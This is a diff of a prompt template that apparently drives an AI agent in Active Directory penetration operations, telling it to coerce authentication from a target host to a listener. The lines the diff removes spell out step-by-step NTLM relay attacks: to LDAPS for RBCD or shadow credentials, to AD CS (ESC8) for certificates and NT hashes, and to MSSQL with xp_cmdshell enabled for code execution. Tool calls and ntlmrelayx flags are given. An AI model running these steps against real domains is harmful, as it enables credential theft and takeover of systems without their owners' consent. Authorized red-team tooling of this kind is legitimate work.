@@ -1,11 +1,7 @@
 ## Coercion Task: {{ task_id }}
 
-**Coerce target:** {{ target_ip }}
+**Target:** {{ target_ip }}
 **Listener:** {{ listener_ip }}
-{% if relay_target %}**Relay destination:** {{ relay_target }}{% endif %}
-{% if mssql_target %}**MSSQL relay target:** mssql://{{ mssql_target }}{% endif %}
-{% if ca_name %}**ADCS CA name:** {{ ca_name }}{% endif %}
-{% if relay_domain %}**Relay target domain:** {{ relay_domain }}{% endif %}
 
 {% if techniques -%}
 **Techniques:**
@@ -14,45 +10,7 @@
 {% endfor -%}
 {% endif -%}
 
-{% if technique is defined and technique == "ntlm_relay_ldap" %}
-**This is an NTLM relay attack — you MUST start the relay listener BEFORE coercing, or the captured auth has nowhere to go.**
-
-Execution order (do NOT skip step 1):
-
-1. Call `ntlmrelayx_to_ldaps` with `dc_ip="{{ relay_target }}"` to start the LDAPS relay listener. Confirm it reports "Running" / "Started" before continuing.
-2. Then call `petitpotam` (preferred — unauth on unpatched DCs) or `coercer` with `target="{{ target_ip }}"`, `listener="{{ listener_ip }}"`{% if has_coerce_credential %}, `username="{{ coerce_user }}"`, `password=<from credential field>`, `domain="{{ coerce_domain }}"`{% endif %} to force `{{ target_ip }}` to authenticate to the listener.
-3. The listener should then perform RBCD or shadow-credentials on the relayed account. Capture any new credentials / certificates in tool output.
-
-{% elif technique is defined and technique == "ntlm_relay_adcs" %}
-**This is an ADCS ESC8 relay+coerce attack — use the combined `relay_and_coerce` tool which orchestrates both sides correctly.**
-
-Call `relay_and_coerce` with:
-- `ca_host="{{ relay_target }}"` (the AD CS web enrollment endpoint)
-- `coerce_target="{{ target_ip }}"` (MUST be a different machine than ca_host — Windows NTLM loopback blocks same-host relay)
-- `attacker_ip="{{ listener_ip }}"`
-{%- if has_coerce_credential %}
-- `coerce_user="{{ coerce_user }}"`, `coerce_password=<from credential field>`, `coerce_domain="{{ coerce_domain }}"`
-{%- endif %}
-{%- if ca_name %}
-- The CA name is `{{ ca_name }}` — include it as context if the tool asks.
-{%- endif %}
-
-The captured certificate is decoded automatically; `auto_certipy_auth` will PKINIT for the NT hash on the next tick.
-
-{% elif technique is defined and technique == "ntlm_relay_mssql" %}
-**This is an NTLM-relay-to-MSSQL attack — start the MSSQL relay listener BEFORE coercing.**
-
-The MSSQL host (`{{ mssql_target }}`) has SMB signing disabled, so a coerced machine-account auth from `{{ target_ip }}` can be relayed straight into MSSQL. Once relayed, enable `xp_cmdshell` for code execution as the SQL service account on the SQL host.
-
-Execution order:
-
-1. Start `ntlmrelayx` targeting `mssql://{{ mssql_target }}` — use `ntlmrelayx_to_smb` if no dedicated MSSQL relay tool is exposed; otherwise invoke the generic ntlmrelayx tool with `-t mssql://{{ mssql_target }} -smb2support` (and `-socks` for a persistent session).
-2. Then call `petitpotam` (preferred — unauth) or `coercer` with `target="{{ target_ip }}"`, `listener="{{ listener_ip }}"`{% if has_coerce_credential %}, `username="{{ coerce_user }}"`, `password=<from credential field>`, `domain="{{ coerce_domain }}"`{% endif %}.
-3. On successful relay, enable `xp_cmdshell` and run `whoami /priv` to confirm code execution context, then hand off to lateral/privesc.
-
-{% else %}
-Attempt to coerce authentication from {{ target_ip }} to {{ listener_ip }}.
-{% endif %}
+Attempt to coerce authentication from the target to the listener.
 
 {% if state_context %}
 ## Current Operation State
@@ -60,4 +18,4 @@ Attempt to coerce authentication from {{ target_ip }} to {{ listener_ip }}.
 {{ state_context }}
 {% endif -%}
 
-Call `task_complete` when coercion + relay attempt finishes — include in the status whether the listener captured any authentication and what landed downstream (cert, hash, SOCKS session, xp_cmdshell).
+Call `task_complete` when coercion attempt finishes.
